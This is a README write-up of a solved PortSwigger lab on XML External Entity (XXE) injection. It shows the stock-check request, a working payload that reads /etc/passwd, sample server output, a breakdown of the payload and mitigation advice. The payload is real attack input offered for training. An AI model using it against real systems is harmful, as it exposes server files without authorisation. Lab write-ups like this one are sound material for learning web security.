📁 `README.md` — XXE via External Entity (Apprentice)

# 📄 Exploiting XXE Using External Entities to Retrieve Files

**🧪 Lab Level:** Apprentice  
**🔐 Vulnerability:** XML External Entity (XXE)  
**✅ Status:** Solved  
**🛠 Platform:** PortSwigger Web Security Academy  
**🎯 Objective:** Retrieve the contents of `/etc/passwd` using a basic XXE injection.

---

## 🔍 Lab Summary

This lab demonstrates how an XML parser vulnerable to external entities can be exploited to read files from the server's filesystem.  
The "Check stock" feature parses XML input and reflects back invalid input in the response — which is ideal for testing XXE.

---

## 🚦 Steps to Exploit

### 📥 Original HTTP Request

```http
POST /product/stock HTTP/1.1
Host: [YOUR-LAB-HOST]
Content-Type: application/xml
Content-Length: [XX]

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
````

---

### 💣 Malicious Payload (External Entity Injection)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

---
![XXE](https://github.com/Kabilala/xxe/blob/main/lab1/lab1.png)

### 🧾 Server Response

When the injection is successful, the server returns an error containing the contents of `/etc/passwd`:

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

## 🧠 Technical Breakdown

| Component                                   | Purpose                                                                   |
| ------------------------------------------- | ------------------------------------------------------------------------- |
| `<!DOCTYPE>`                                | Declares a DTD (Document Type Definition)                                 |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Defines an external entity pointing to the target file                    |
| `&xxe;`                                     | Triggers the entity resolution, injecting file contents into the XML body |

---

## 🔐 Mitigation Techniques

To prevent this vulnerability in production systems:

* Disable DTD processing in your XML parsers
* Use secure libraries (e.g. `defusedxml` in Python, `SAXParserFactory.setFeature` in Java)
* Sanitize or avoid XML input from untrusted sources
* Apply the principle of least privilege: ensure the app cannot read sensitive files

---

## 📚 Resources

* [🛡️ PortSwigger XXE Labs](https://portswigger.net/web-security/xxe)
* [📄 OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [🔥 PayloadsAllTheThings: XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)

---

## 👩‍💻 Author

**Kaouthar Belkebir**
Cybersecurity Enthusiast | Pentest Learner | PortSwigger & TryHackMe Explorer
[LinkedIn](https://www.linkedin.com/in/kaouthar-belkebir-ab453223b) | [Credly Certifications](https://www.credly.com/users/kawtar-belkebir)

```
